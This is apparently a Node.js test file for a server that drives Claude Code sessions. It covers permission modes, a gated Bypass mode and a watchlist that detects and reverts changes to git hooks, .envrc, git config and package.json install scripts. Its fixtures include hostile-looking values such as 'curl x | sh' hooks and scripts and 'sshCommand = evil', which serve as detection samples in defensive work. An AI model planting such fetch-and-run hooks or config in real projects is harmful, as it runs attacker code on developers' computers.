// Permission modes (modes.mjs) as sessions.mjs drives Claude Code with them — Read only, the page modes mapped both
// ways, one composed `permissions` object in the flag layer (shallow merge), Bypass permissions behind its gate and
// never kept — and the watchlist (watch.mjs): snapshots at a turn's start and end, the `watch` event, Revert.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import { SessionManager } from '../server/sessions.mjs';
import { PermissionBroker, safeSuggestions } from '../server/broker.mjs';
import { MODES } from '../server/protocol.mjs';
import { READ_ONLY_DENY, BYPASS_ASK, START_MODES, cliMode, pageMode, normMode, permissionsFor, unionPermissions } from '../server/modes.mjs';
import { checkSnapshot, diffSnapshots, lifecycleOf, watchEvent, watched, hooksRunScripts, revertable } from '../server/watch.mjs';
import { fakeQuery } from './fake-sdk.mjs';

const tick = (ms = 20) => new Promise((r) => setTimeout(r, ms));
function manager(opts = {}) {
  const queries = [], events = [], states = [], sent = [];
  const fq = fakeQuery(sent);
  const broker = new PermissionBroker({});
  const mgr = new SessionManager({ broker, spawn: () => { throw new Error('not used'); },
    query: (a) => { const q = fq(a); queries.push(q); return q; },
    onEvent: (s, seq, ev) => events.push([s.id, seq, ev]), onState: (s) => states.push([s.id, s.state, s.mode]), ...opts });
  return { mgr, broker, queries, events, states, sent };
}
// the flag calls a process got after its first one (the start's)
const flagCalls = (q) => q.calls.filter((c) => Array.isArray(c) && (c[0] === 'applyFlagSettings' || c[0] === 'setPermissionMode')).slice(1);

test('the page modes and Claude Code\'s: Read only is dontAsk; mapped back both ways', () => {
  assert.deepEqual(MODES, ['readOnly', 'plan', 'default', 'acceptEdits', 'auto', 'bypassPermissions']);
  assert.deepEqual(START_MODES, ['readOnly', 'plan', 'default', 'acceptEdits']);
  for (const m of MODES) assert.equal(pageMode(cliMode(m)), m, m);
  assert.equal(cliMode('readOnly'), 'dontAsk');
  assert.equal(pageMode('dontAsk'), 'readOnly');
  assert.equal(pageMode('manual'), 'default');
  for (const bad of ['readOnly', 'x', '', null, undefined, 7, '__proto__']) assert.equal(pageMode(bad), null, String(bad));
  assert.equal(normMode('dontAsk'), 'readOnly', 'the former "Don\'t ask" is Read only now');
  assert.deepEqual(permissionsFor('readOnly'), { deny: ['Edit', 'Write', 'NotebookEdit', 'EnterPlanMode'] }, 'EnterPlanMode too: Claude cannot leave Read only for Plan');
  assert.deepEqual(permissionsFor('bypassPermissions').ask, BYPASS_ASK);
  for (const m of ['plan', 'default', 'acceptEdits']) assert.equal(permissionsFor(m), null);
  assert.deepEqual(unionPermissions(permissionsFor('readOnly'), permissionsFor('bypassPermissions')), { deny: READ_ONLY_DENY, ask: BYPASS_ASK });
  assert.equal(unionPermissions(null, null), null);
  // the bypass ask rules: absolute, under /workspace, for the files that run on your computer later
  for (const r of BYPASS_ASK) assert.match(r, /^Edit\(\/\/workspace\/\.[a-z.]/);
  for (const f of ['.git/**', '.claude/**', '.vscode/**', '.husky/**', '.envrc', '.mcp.json']) assert.ok(BYPASS_ASK.includes(`Edit(//workspace/${f})`), f);
});

test('Read only: starts as dontAsk with the edit tools denied, before the first prompt is read', async () => {
  const { mgr, queries, sent, events } = manager();
  const s = mgr.get(mgr.open({ model: 'claude-haiku-5-5', mode: 'readOnly' }).id);
  const q = queries[0];
  assert.equal(q.options.permissionMode, 'dontAsk');
  assert.deepEqual(q.calls[0], ['applyFlagSettings', { disableAutoMode: 'disable', permissions: { deny: READ_ONLY_DENY } }]);
  s.prompt({ text: 'hi' });
  await tick();
  assert.equal(sent.length, 1);
  assert.equal(events.find(([, , ev]) => ev.type === 'init')[2].permissionMode, 'readOnly', 'init says the page mode');
  assert.equal(s.mode, 'readOnly');
  assert.equal(s.info().mode, 'readOnly');
  // the former "Don't ask" opens as Read only
  assert.equal(mgr.get(mgr.open({ mode: 'dontAsk' }).id).mode, 'readOnly');
  mgr.closeAll();
});

test('switching: one composed permissions object, both modes\' rules while it switches, the new one\'s alone after', async () => {
  const { mgr, queries } = manager();
  const s = mgr.get(mgr.open({ mode: 'default' }).id);
  const q = queries[0];
  const layer = () => ({ ...q.flags });
  await s.setMode('readOnly');
  // more rules first (deny), then the mode
  assert.deepEqual(flagCalls(q), [['applyFlagSettings', { permissions: { deny: READ_ONLY_DENY } }], ['setPermissionMode', 'dontAsk']]);
  assert.deepEqual(layer(), { disableAutoMode: 'disable', permissions: { deny: READ_ONLY_DENY } }, 'disableAutoMode stays (shallow merge)');
  q.calls.length = 1;
  await s.setMode('acceptEdits');
  // the mode first, then the rules go (null clears the key)
  assert.deepEqual(flagCalls(q), [['setPermissionMode', 'acceptEdits'], ['applyFlagSettings', { permissions: null }]]);
  assert.deepEqual(layer(), { disableAutoMode: 'disable' });
  q.calls.length = 1;
  await s.setMode('plan');
  assert.deepEqual(flagCalls(q), [['setPermissionMode', 'plan']], 'no rules of ours for Plan, Manual, Accept edits');
  assert.equal(s.mode, 'plan');
  // a refused switch: the old mode's rules stay, the mode too
  await s.setMode('readOnly');
  q.calls.length = 1;
  q.refuseMode = 'nope';
  await assert.rejects(s.setMode('acceptEdits'), /nope/);
  assert.equal(s.mode, 'readOnly');
  assert.deepEqual(layer().permissions, { deny: READ_ONLY_DENY });
  q.refuseMode = null;
  mgr.closeAll();
});

test('Claude Code\'s own mode changes are followed (dontAsk is Read only, with its rules set); a status says the page mode', async () => {
  const { mgr, queries, events } = manager();
  const s = mgr.get(mgr.open({ mode: 'default' }).id);
  const q = queries[0];
  s.prompt({ text: 'mode:dontAsk' });
  await tick();
  assert.equal(s.mode, 'readOnly');
  assert.deepEqual(q.flags.permissions, { deny: READ_ONLY_DENY }, 'the deny rules follow');
  assert.ok(events.some(([, , ev]) => ev.type === 'status' && ev.permissionMode === 'readOnly'));
  s.prompt({ text: 'mode:acceptEdits' });   // a plan approved with "accept edits"
  await tick();
  assert.equal(s.mode, 'acceptEdits');
  assert.equal(q.flags.permissions, undefined);
  s.prompt({ text: 'mode:bogus' });
  await tick();
  assert.equal(s.mode, 'acceptEdits');
  mgr.closeAll();
});

test('"Always" never switches to bypassPermissions, auto or dontAsk (only the page does, through set_mode)', () => {
  const sugg = (mode) => [{ type: 'setMode', mode, destination: 'session' }];
  for (const m of ['bypassPermissions', 'auto', 'dontAsk', 'readOnly']) assert.deepEqual(safeSuggestions(sugg(m)), [], m);
  for (const m of ['default', 'acceptEdits', 'plan']) assert.equal(safeSuggestions(sugg(m)).length, 1, m);
});

test('Bypass permissions, the gate: the setting × confirmed × a process started allowing it', async () => {
  // setting off: refused, and no process is started allowing it
  {
    const { mgr, queries } = manager();
    const s = mgr.get(mgr.open({}).id);
    assert.equal(queries[0].options.allowDangerouslySkipPermissions, undefined);
    await assert.rejects(s.setMode('bypassPermissions', { confirmed: true }), (e) => e.status === 403 && /Bypass permissions is off/.test(e.message));
    assert.equal(s.mode, 'default');
    mgr.closeAll();
  }
  // setting on: every process may switch; never without the confirmation; then ask rules first, then the mode
  {
    const { mgr, queries } = manager({ allowBypass: true });
    const s = mgr.get(mgr.open({ mode: 'acceptEdits' }).id);
    const q = queries[0];
    assert.equal(q.options.allowDangerouslySkipPermissions, true);
    assert.equal(q.options.permissionMode, 'acceptEdits', 'never started in bypass');
    await assert.rejects(s.setMode('bypassPermissions'), /confirmation/);
    await assert.rejects(s.setMode('bypassPermissions', { confirmed: 'yes' }), /confirmation/);
    assert.equal(s.mode, 'acceptEdits');
    q.calls.length = 1;
    await s.setMode('bypassPermissions', { confirmed: true });
    assert.deepEqual(flagCalls(q), [['applyFlagSettings', { permissions: { ask: BYPASS_ASK } }], ['setPermissionMode', 'bypassPermissions']]);
    assert.equal(s.mode, 'bypassPermissions');
    assert.equal(queries.length, 1, 'the same process');
    // back to Manual: the mode first, then the ask rules go
    q.calls.length = 1;
    await s.setMode('default');
    assert.deepEqual(flagCalls(q), [['setPermissionMode', 'default'], ['applyFlagSettings', { permissions: null }]]);
    // Read only → Bypass: both sets of rules while it switches
    await s.setMode('readOnly');
    q.calls.length = 1;
    await s.setMode('bypassPermissions', { confirmed: true });
    assert.deepEqual(flagCalls(q), [['applyFlagSettings', { permissions: { deny: READ_ONLY_DENY, ask: BYPASS_ASK } }], ['setPermissionMode', 'bypassPermissions'],
      ['applyFlagSettings', { permissions: { ask: BYPASS_ASK } }]]);
    mgr.closeAll();
  }
  // a process started before the setting allowed it: started again (resumed), then switched; never mid-turn
  {
    const { mgr, queries, events } = manager();
    const s = mgr.get(mgr.open({ model: 'claude-haiku-5-5' }).id);
    s.prompt({ text: 'one' });
    await tick();
    mgr.allowBypass = true;
    s.state = 'busy';
    await assert.rejects(s.setMode('bypassPermissions', { confirmed: true }), (e) => e.status === 409 && /working/.test(e.message));
    s.state = 'idle';
    await s.setMode('bypassPermissions', { confirmed: true });
    assert.equal(queries.length, 2);
    const o = queries[1].options;
    assert.deepEqual([o.resume, o.allowDangerouslySkipPermissions, o.permissionMode, o.model], [s.id, true, 'default', 'claude-haiku-5-5']);
    assert.ok(queries[0].calls.includes('close'));
    assert.ok(events.some(([, , ev]) => ev.type === 'local' && /Restarting Claude Code/.test(ev.text)));
    assert.equal(s.mode, 'bypassPermissions');
    mgr.closeAll();
  }
});

test('Bypass permissions is never kept: an ended process, an idle close, a resume, a new conversation start in Manual', async () => {
  const { mgr, queries, events } = manager({ allowBypass: true, transcriptExists: async () => false });
  const s = mgr.get(mgr.open({ model: 'claude-haiku-5-5' }).id);
  s.prompt({ text: 'one' });
  await tick();
  await s.setMode('bypassPermissions', { confirmed: true });
  mgr.sweepIdle(Date.now() + 31 * 60000);
  assert.equal(s.open, false);
  assert.equal(s.mode, 'default');
  assert.match(events.at(-1)[2].text, /in Manual/);
  s.prompt({ text: 'two' });
  assert.equal(queries.at(-1).options.permissionMode, 'default');
  // a page resuming it can only ask for a start mode
  assert.throws(() => mgr.open({ resume: s.id, mode: 'bypassPermissions' }), /never starts in bypassPermissions/);
  // without a process, Bypass is not kept for a next start: the process is started for it
  s.close();
  await s.setMode('bypassPermissions', { confirmed: true });
  assert.equal(s.open, true);
  assert.equal(s.mode, 'bypassPermissions');
  // the process ends (it failed): Manual again
  s.ended('boom');
  assert.equal(s.mode, 'default');
  // a new conversation started from a session in Bypass: Manual
  const t = mgr.get(mgr.open({}).id);
  await t.setMode('bypassPermissions', { confirmed: true });
  const N = '00000000-0000-4000-8000-0000000000bb';
  t.prompt({ text: `reset:${N}` });
  await tick(60);
  assert.equal(mgr.get(N).mode, 'default');
  assert.equal(queries.at(-1).options.permissionMode, 'default');
  mgr.closeAll();
});

// --- the watchlist ---
const sha = (b) => crypto.createHash('sha256').update(b).digest('hex');
const file = (path, text, mode = 0o644) => ({ path, type: 'file', size: Buffer.byteLength(text), mode, sha256: sha(text), data: Buffer.from(text).toString('base64') });

test('watch.mjs: which files, what changed, why (package.json: its install scripts only), what the page gets', () => {
  for (const p of ['.git/hooks/pre-commit', '.git/hooks', '.git/config', '.husky/pre-push', '.envrc', '.vscode/tasks.json', '.vscode/settings.json',
    '.claude/settings.json', '.claude/settings.local.json', '.mcp.json', 'package.json', '.devcontainer.json', '.devcontainer/devcontainer.json']) assert.ok(watched(p), p);
  for (const p of ['src/x.js', '.git/hooks/../config', '.git/objects/ab', 'a/package.json', '.vscode/launch.json', '../.envrc', '.claude/agents/x.md', null]) assert.equal(watched(p), null, String(p));
  assert.equal(checkSnapshot(null), null);
  assert.equal(checkSnapshot({ files: 'x' }), null);
  const snap = checkSnapshot({ files: [file('.git/config', '[core]\n'), { path: '/etc/passwd', type: 'file', sha256: sha('x') }, { path: '.envrc', type: 'file', sha256: 'nope' },
    { path: '.mcp.json', type: 'pipe', sha256: sha('x') }, file('.git/config', 'twice')] });
  assert.deepEqual([...snap.keys()], ['.git/config'], 'only watched paths with a hash, once');
  const pkg = (scripts) => file('package.json', JSON.stringify({ name: 'x', scripts, dependencies: { a: '1' } }));
  assert.equal(lifecycleOf(checkSnapshot({ files: [pkg({ test: 'jest' })] }).get('package.json')), '');
  const a = checkSnapshot({ files: [file('.git/config', '[core]\n'), pkg({ test: 'jest' }), file('.vscode/settings.json', '{}')] });
  const b = checkSnapshot({ files: [file('.git/config', '[core]\n\tfsmonitor = ./x\n'), pkg({ test: 'vitest', postinstall: 'curl x | sh' }),
    file('.git/hooks/pre-commit', 'echo hi\n', 0o755), file('.vscode/settings.json', '{}')] });
  const c = diffSnapshots(a, b);
  assert.deepEqual(c.map((x) => [x.path, x.change]), [['.git/config', 'changed'], ['.git/hooks/pre-commit', 'added'], ['package.json', 'changed']]);
  assert.match(c[2].why, /postinstall changed/);
  // package.json: only its install scripts count
  assert.deepEqual(diffSnapshots(checkSnapshot({ files: [pkg({ test: 'a' })] }), checkSnapshot({ files: [pkg({ test: 'b', build: 'tsc' })] })), []);
  // a hook made executable counts; a removed one too
  const h = (mode) => checkSnapshot({ files: [file('.git/hooks/pre-push', 'x', mode)] });
  assert.equal(diffSnapshots(h(0o644), h(0o755))[0].change, 'changed');
  assert.equal(diffSnapshots(h(0o755), checkSnapshot({ files: [] }))[0].change, 'removed');
  const ev = watchEvent('id1', 'turn', c);
  assert.equal(ev.type, 'watch');
  const hook = ev.changes.find((x) => x.path === '.git/hooks/pre-commit');
  assert.deepEqual([hook.before, hook.after, hook.revertable, hook.exec], [null, 'echo hi\n', true, true]);
  assert.match(hook.why, /git runs it on your computer/);
});

function watcher(script) {
  const w = { calls: [], restores: [], snaps: script.slice(), fail: null };
  w.snapshot = async () => { w.calls.push('snapshot'); if (w.fail) throw new Error(w.fail); return { files: w.snaps.length > 1 ? w.snaps.shift() : w.snaps[0] }; };
  w.restore = async (r) => { w.restores.push(r); if (r.path === '.envrc') throw new Error('it changed again since: not put back'); return { path: r.path, action: r.data === null ? 'trashed' : 'restored' }; };
  return w;
}

test('watchlist: a snapshot before the turn\'s first prompt goes, one after its result; a change gives a watch event; Revert', async () => {
  const cfg0 = file('.git/config', '[core]\n'), cfg1 = file('.git/config', '[core]\n\tsshCommand = evil\n');
  const hook = file('.git/hooks/pre-commit', 'curl x | sh\n', 0o755);
  const w = watcher([[cfg0], [cfg1, hook], [cfg1, hook]]);
  const { mgr, events, sent } = manager({ watcher: w });
  const s = mgr.get(mgr.open({}).id);
  s.prompt({ text: 'do it' });
  assert.equal(sent.length, 0, 'waits for the snapshot');
  await tick(60);
  assert.equal(sent.length, 1);
  assert.deepEqual(w.calls, ['snapshot', 'snapshot']);
  const ev = events.map(([, , e]) => e).find((e) => e.type === 'watch');
  assert.equal(ev.when, 'turn');
  assert.deepEqual(ev.changes.map((c) => [c.path, c.change]), [['.git/config', 'changed'], ['.git/hooks/pre-commit', 'added']]);
  // Revert: each file only while it is still as the event saw it (bn-coded checks the hash)
  const r = await s.revertWatch(ev.id);
  assert.deepEqual(r.map((x) => [x.path, x.ok, x.action]), [['.git/config', true, 'restored'], ['.git/hooks/pre-commit', true, 'trashed']]);
  // (git's config last: it may name the hook folder the hook is in)
  assert.deepEqual(w.restores[0], { path: '.git/hooks/pre-commit', ifSha256: hook.sha256, data: null, mode: null });
  assert.deepEqual(w.restores[1], { path: '.git/config', ifSha256: cfg1.sha256, data: cfg0.data, mode: 0o644 });
  assert.ok(events.some(([, , e]) => e.type === 'local' && /Put back/.test(e.text)));
  assert.deepEqual((await s.revertWatch(ev.id, '.git/config')).map((x) => x.action), ['already']);
  await assert.rejects(s.revertWatch('00000000-0000-4000-8000-00000000dead'), (e) => e.status === 404);
  mgr.closeAll();
});

test('watchlist: the page asks for a check now (the Review pane changed a watched file): told at once, not again at the next turn', async () => {
  const env0 = file('.envrc', 'x=1\n'), env1 = file('.envrc', 'curl x | sh\n');
  const w = watcher([[env0], [env0], [env1], [env1]]);
  const { mgr, events } = manager({ watcher: w });
  const s = mgr.get(mgr.open({}).id);
  s.prompt({ text: 'one' });
  await tick(60);
  await s.watchNow();
  const evs = () => events.map(([, , e]) => e).filter((e) => e.type === 'watch');
  assert.equal(evs().length, 1);
  assert.equal(evs()[0].when, 'between');
  assert.deepEqual(evs()[0].changes.map((c) => c.path), ['.envrc']);
  s.prompt({ text: 'two' });
  await tick(60);
  assert.equal(evs().length, 1, 'the next turn does not report it again');
  // checks asked for before the queued one starts share it (one snapshot)
  const before = w.calls.length;
  const p1 = s.watchNow(), p2 = s.watchNow(), p3 = s.watchNow();
  assert.ok(p1 === p2 && p2 === p3);
  await p3;
  assert.equal(w.calls.length, before + 1);
  // while a turn runs it does nothing (the turn's end reports what changed)
  s.state = 'busy';
  const n = w.calls.length;
  await s.watchNow();
  assert.equal(w.calls.length, n);
  mgr.closeAll();
});

// the watchlist's fixed patterns: the page mirrors them for the Review pane (code/web/src/review.ts watchKind, whose
// test has the same table)
export const WATCH_TABLE = [['.git/hooks/pre-commit', 'git-hook'], ['.git/config', 'git-config'], ['.husky/pre-push', 'husky'], ['.envrc', 'direnv'],
  ['.vscode/tasks.json', 'vscode'], ['app.code-workspace', 'vscode'], ['.claude/settings.local.json', 'claude'], ['.mcp.json', 'mcp'], ['package.json', 'npm'],
  ['.npmrc', 'package-manager'], ['.devcontainer/x/devcontainer.json', 'devcontainer'], ['lefthook.yml', 'hook-manager'], ['src/package.json', null],
  ['.claude\\settings.json', null], ['README.md', null]];
test('watchlist: the fixed patterns (the same table as the page\'s)', () => {
  for (const [p, kind] of WATCH_TABLE) assert.equal(watched(p)?.kind ?? null, kind, p);
});

test('watchlist: changes between turns are told at the next turn\'s start; a refused revert says why; an old sandbox turns it off once', async () => {
  const env0 = file('.envrc', 'x=1\n'), env1 = file('.envrc', 'curl x | sh\n');
  const w = watcher([[env0], [env0], [env1], [env1]]);
  const { mgr, events } = manager({ watcher: w });
  const s = mgr.get(mgr.open({}).id);
  s.prompt({ text: 'one' });
  await tick(60);
  assert.equal(events.filter(([, , e]) => e.type === 'watch').length, 0, 'nothing changed in the turn');
  s.prompt({ text: 'two' });
  await tick(60);
  const ev = events.map(([, , e]) => e).find((e) => e.type === 'watch');
  assert.equal(ev.when, 'between');
  assert.deepEqual(ev.changes.map((c) => c.path), ['.envrc']);
  const r = await s.revertWatch(ev.id);
  assert.deepEqual([r[0].ok, r[0].error], [false, 'it changed again since: not put back']);
  // a sandbox whose bn-coded has no watchlist: said once, prompts go on
  w.fail = 'unknown op';
  s.prompt({ text: 'three' });
  await tick(60);
  s.prompt({ text: 'four' });
  await tick(60);
  assert.equal(events.filter(([, , e]) => e.type === 'local' && /not checked in this session/.test(e.text)).length, 1);
  assert.equal(events.filter(([, , e]) => e.type === 'text' && /pong:four/.test(e.text)).length, 1);
  mgr.closeAll();
});


test('set_mode requests run one after another: a second one sent before the first is answered never mixes them up', async () => {
  const { mgr, queries } = manager({ allowBypass: true });
  const s = mgr.get(mgr.open({}).id);
  const q = queries[0];
  q.echoMode = true; q.delay = 15;
  // Bypass confirmed, then Accept edits before its reply: the page's last word wins, rules and mode agree
  const a = s.setMode('bypassPermissions', { confirmed: true });
  const b = s.setMode('acceptEdits');
  await Promise.all([a, b]);
  await tick(80);   // (the late status echoes come in)
  assert.equal(s.mode, 'acceptEdits');
  assert.equal(q.calls.filter((c) => c[0] === 'setPermissionMode').at(-1)[1], 'acceptEdits');
  assert.equal(q.flags.permissions, undefined, 'no Bypass ask rules left, no Read only rules');
  // Read only, then Manual at once
  await Promise.all([s.setMode('readOnly'), s.setMode('default')]);
  await tick(80);
  assert.equal(s.mode, 'default');
  assert.equal(q.calls.filter((c) => c[0] === 'setPermissionMode').at(-1)[1], 'default');
  assert.equal(q.flags.permissions, undefined);
  // a status Claude Code owed for an earlier switch, arriving late, does not move the session back
  q.delay = 0; q.echoMode = false;
  await s.setMode('acceptEdits');
  q.emit({ type: 'system', subtype: 'status', status: null, permissionMode: 'acceptEdits' });
  await s.setMode('plan');
  q.emit({ type: 'system', subtype: 'status', status: null, permissionMode: 'plan' });
  await tick(30);
  assert.equal(s.mode, 'plan');
  mgr.closeAll();
});

test('a refused switch tells the pages the mode the session is in (a status), and the queue goes on', async () => {
  const { mgr, queries, events } = manager();
  const s = mgr.get(mgr.open({}).id);
  const q = queries[0];
  q.refuseMode = 'busy';
  const n = events.length;
  await assert.rejects(s.setMode('readOnly'), /busy/);
  const st = events.slice(n).map(([, , e]) => e).filter((e) => e.type === 'status');
  assert.equal(st.at(-1).permissionMode, 'default');
  q.refuseMode = null;
  await s.setMode('acceptEdits');
  assert.equal(s.mode, 'acceptEdits');
  mgr.closeAll();
});

test('Claude Code switching to Bypass permissions (or auto) by itself is undone and said', async () => {
  const { mgr, queries, events } = manager({ allowBypass: true });
  const s = mgr.get(mgr.open({}).id);
  const q = queries[0];
  q.emit({ type: 'system', subtype: 'status', status: null, permissionMode: 'bypassPermissions' });
  await tick(40);
  assert.equal(s.mode, 'default');
  assert.equal(q.calls.filter((c) => c[0] === 'setPermissionMode').at(-1)[1], 'default');
  assert.ok(events.some(([, , e]) => e.type === 'local' && /by itself/.test(e.text)));
  mgr.closeAll();
});

test('a model switch: the model goes into the /model picker first (no API check); a failed check is tried once more; a refusal is said', async () => {
  const { mgr, queries, events } = manager();
  const s = mgr.get(mgr.open({ model: 'claude-haiku-5-5' }).id);
  const q = queries[0];
  await s.setModel('claude-sonnet-5-5');
  assert.deepEqual(q.calls.slice(1, 3), [['applyFlagSettings', { modelPicker: { options: [{ model: 'claude-haiku-5-5' }, { model: 'claude-sonnet-5-5' }] } }], ['setModel', 'claude-sonnet-5-5']]);
  await s.setModel('claude-haiku-5-5');   // both listed already: no second picker update
  assert.deepEqual(q.calls.slice(3), [['setModel', 'claude-haiku-5-5']]);
  q.failModel = 1;
  await s.setModel('claude-sonnet-5-5');   // the check failed once: tried again
  assert.equal(s.model, 'claude-sonnet-5-5');
  q.failModel = 2;
  const n = events.length;
  await assert.rejects(s.setModel('claude-haiku-5-5'), /Couldn't confirm model/);
  assert.equal(s.model, 'claude-sonnet-5-5', 'still the model that runs');
  assert.equal(events.slice(n).map(([, , e]) => e).filter((e) => e.type === 'status').at(-1).model, 'claude-sonnet-5-5');
  mgr.closeAll();
});


test('watch.mjs: git\'s own files the sandbox places (hooksPath, includes, fsmonitor) by kind only; hook tools\' package.json keys; every script once a hook runs them; caps', () => {
  // a path no pattern has is taken only with a git kind, and only as a safe relative path
  assert.equal(watched('.githooks/pre-commit', 'git-hook').kind, 'git-hook');
  assert.equal(watched('tools/fsmon.sh', 'fsmonitor').kind, 'fsmonitor');
  for (const [p, k] of [['src/app.js', 'npm'], ['src/app.js', undefined], ['../x', 'git-hook'], ['a/./b', 'git-config'], ['/etc/x', 'git-config']]) assert.equal(watched(p, k), null, `${p} ${k}`);
  for (const p of ['.pre-commit-config.yaml', 'lefthook.yml', '.lefthook.yaml', 'lefthook-local.yml', '.lintstagedrc', '.lintstagedrc.cjs', 'lint-staged.config.mjs',
    '.yarnrc.yml', '.npmrc', '.pnpmfile.cjs', 'x.code-workspace', '.devcontainer/py/devcontainer.json', '.git/modules/s/hooks/pre-push', '.git/modules/s/config']) assert.ok(watched(p), p);
  for (const p of ['Makefile', 'pyproject.toml', '.nvmrc', '.tool-versions', '.env', '.idea/workspace.xml', 'a/b.code-workspace']) assert.equal(watched(p), null, p);
  // package.json: hook tools' keys count; every script once a hook here runs package scripts
  const pkg = (o) => file('package.json', JSON.stringify(o));
  const snap = (...f) => checkSnapshot({ files: f });
  assert.equal(diffSnapshots(snap(pkg({ scripts: { test: 'a' } })), snap(pkg({ scripts: { test: 'b' } }))).length, 0, 'no hook: a test script is not flagged');
  const c1 = diffSnapshots(snap(pkg({ scripts: {} })), snap(pkg({ scripts: {}, 'simple-git-hooks': { 'pre-commit': 'npx x' } })));
  assert.match(c1[0].why, /simple-git-hooks changed/);
  const hook = file('.git/hooks/pre-commit', '#!/bin/sh\nnpm test\n', 0o755);
  assert.equal(hooksRunScripts(snap(hook)), true);
  const c2 = diffSnapshots(snap(hook, pkg({ scripts: { test: 'jest' } })), snap(hook, pkg({ scripts: { test: 'curl x | sh' } })));
  assert.deepEqual(c2.map((c) => c.path), ['package.json']);
  assert.match(c2[0].why, /a git hook here runs package scripts\): scripts\.test changed/);
  // the .git link and hook folders: shown, never reverted here
  const gd = diffSnapshots(snap({ path: '.git', kind: 'git-dir', type: 'dir', sha256: sha('dir') }), snap({ path: '.git', kind: 'git-dir', type: 'file', size: 9, sha256: sha('gitdir: x'), data: Buffer.from('gitdir: x').toString('base64') }));
  assert.equal(gd[0].kind, 'git-dir');
  assert.equal(revertable(gd[0]), false);
  // the copies: 2 MiB in all (a file beyond: hashed, no copy — no diff, no Revert)
  const big = 'x'.repeat(900 * 1024);
  const s3 = snap(file('.envrc', big), file('.npmrc', big), file('.yarnrc.yml', big));
  assert.deepEqual([...s3.values()].map((e) => e.data !== null), [true, true, false]);
});

test('a switch to the mode Claude Code already said it is in sends nothing; the echo of a switch is waited for only briefly after its answer', async () => {
  const { mgr, queries } = manager();
  mgr.modeEchoMs = 40;
  const s = mgr.get(mgr.open({}).id);
  const q = queries[0];
  q.echoMode = 'change';
  s.prompt({ text: 'hi' });
  await tick(40);   // (init: default)
  const n = q.calls.length;
  await s.setMode('default');
  assert.equal(q.calls.slice(n).filter((c) => c[0] === 'setPermissionMode').length, 0, 'nothing to switch');
  // Claude Code to Plan by itself and back to Manual: both followed (no echo of ours swallows the second)
  q.emit({ type: 'system', subtype: 'status', status: null, permissionMode: 'plan' });
  await tick(10);
  assert.equal(s.mode, 'plan');
  q.emit({ type: 'system', subtype: 'status', status: null, permissionMode: 'default' });
  await tick(10);
  assert.equal(s.mode, 'default');
  // a switch whose status never comes: once the window has passed, the same mode reported is Claude Code's own again
  q.echoMode = false;
  await s.setMode('acceptEdits');
  await tick(60);
  q.emit({ type: 'system', subtype: 'status', status: null, permissionMode: 'plan' });
  await tick(10);
  q.emit({ type: 'system', subtype: 'status', status: null, permissionMode: 'acceptEdits' });
  await tick(10);
  assert.equal(s.mode, 'acceptEdits', 'not taken for a late echo');
  mgr.closeAll();
});

test('what Claude Code says while set_mode requests run is reconciled after the last one: its own later switch holds; Bypass by itself is undone', async () => {
  const { mgr, queries, events } = manager();
  const s = mgr.get(mgr.open({}).id);
  const q = queries[0];
  // (after Claude Code answered our switch, while its rules are applied: then it switches by itself)
  const apply = q.applyFlagSettings.bind(q), sp = q.setPermissionMode.bind(q);
  let say = null;
  q.setPermissionMode = async (m) => { await sp(m); if (say) { const x = say; say = null; q.after = x; } };
  q.applyFlagSettings = async (x) => {
    if (q.after) { const m = q.after; q.after = null; q.emit({ type: 'system', subtype: 'status', status: null, permissionMode: m }); await tick(5); }
    return apply(x);
  };
  await s.setMode('readOnly');
  say = 'plan';
  await s.setMode('acceptEdits');   // (Read only's rules go after the mode: Claude Code says Plan meanwhile)
  await tick(10);
  assert.equal(s.mode, 'plan', 'its own switch, after ours, holds');
  await s.setMode('readOnly');
  say = 'bypassPermissions';
  const n = events.length;
  await s.setMode('acceptEdits');
  await tick(40);
  assert.ok(events.slice(n).some(([, , e]) => e.type === 'local' && /by itself/.test(e.text)), 'said');
  assert.equal(s.mode, 'default', 'set back to Manual');
  assert.equal(q.calls.filter((c) => c[0] === 'setPermissionMode').at(-1)[1], 'default');
  mgr.closeAll();
});

test('watchlist: a snapshot the sandbox could not complete is said — once on its own, then on each card; never a silent cut', async () => {
  const hook = file('.git/hooks/pre-commit', 'curl x | sh\n', 0o755);
  const w = watcher([[], [], [], [hook]]);
  w.truncated = true;
  w.snapshot = async () => { w.calls.push('snapshot'); return { files: w.snaps.length > 1 ? w.snaps.shift() : w.snaps[0], truncated: w.truncated }; };
  const { mgr, events } = manager({ watcher: w });
  const s = mgr.get(mgr.open({}).id);
  s.prompt({ text: 'one' });
  await tick(80);
  let cards = events.map(([, , e]) => e).filter((e) => e.type === 'watch');
  assert.equal(cards.length, 1);
  assert.deepEqual(cards[0].changes, []);
  assert.match(cards[0].incomplete, /review \.git/);
  s.prompt({ text: 'two' });
  await tick(80);
  cards = events.map(([, , e]) => e).filter((e) => e.type === 'watch');
  assert.equal(cards.length, 2, 'no second card without changes');
  assert.deepEqual(cards[1].changes.map((c) => c.path), ['.git/hooks/pre-commit']);
  assert.match(cards[1].incomplete, /review \.git/);
  // more entries than the server takes: incomplete too
  const many = Array.from({ length: 301 }, (_, i) => file(`.git/hooks/h${i}`, 'x'));
  assert.equal(checkSnapshot({ files: many }).incomplete, true);
  assert.equal(checkSnapshot({ files: many.slice(0, 10) }).incomplete, false);
  mgr.closeAll();
});

test('Revert all: git\'s config goes back last; a file the sandbox no longer counts as watched is tried once more', async () => {
  const cfg0 = file('.git/config', '[core]\n'), cfg1 = file('.git/config', '[core]\n\thooksPath = .githooks\n');
  const hook = { ...file('.githooks/pre-commit', 'curl x | sh\n', 0o755), kind: 'git-hook' };
  const w = watcher([[cfg0], [cfg1, hook], [cfg1, hook]]);
  let refuse = 1;
  w.restore = async (r) => {
    w.restores.push(r.path);
    if (r.path === '.githooks/pre-commit' && refuse-- > 0) throw new Error('not a watched file');
    return { path: r.path, action: r.data === null ? 'trashed' : 'restored' };
  };
  const { mgr, events } = manager({ watcher: w });
  const s = mgr.get(mgr.open({}).id);
  s.prompt({ text: 'do it' });
  await tick(80);
  const ev = events.map(([, , e]) => e).find((e) => e.type === 'watch');
  const r = await s.revertWatch(ev.id);
  assert.deepEqual(w.restores, ['.githooks/pre-commit', '.git/config', '.githooks/pre-commit']);
  assert.deepEqual(r.map((x) => [x.path, x.ok]), [['.git/config', true], ['.githooks/pre-commit', true]]);
  mgr.closeAll();
});
